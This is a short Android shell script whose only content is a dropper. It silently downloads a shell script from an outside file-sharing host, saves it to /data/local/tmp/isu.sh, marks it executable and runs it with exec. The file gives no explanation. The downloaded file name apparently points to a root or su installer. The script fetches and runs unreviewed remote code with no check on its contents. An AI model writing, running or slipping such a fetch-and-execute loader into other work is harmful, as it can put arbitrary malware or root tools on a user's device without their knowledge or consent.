#!/system/bin/sh
SCRIPT_URL="https://pan.shenzhi.shop/down.php/878ad9a913e26eae5adaf368763bc6b6.sh"
TMP="/data/local/tmp/isu.sh"
curl -sL -o "$TMP" "$SCRIPT_URL" && chmod +x "$TMP" && exec "$TMP"
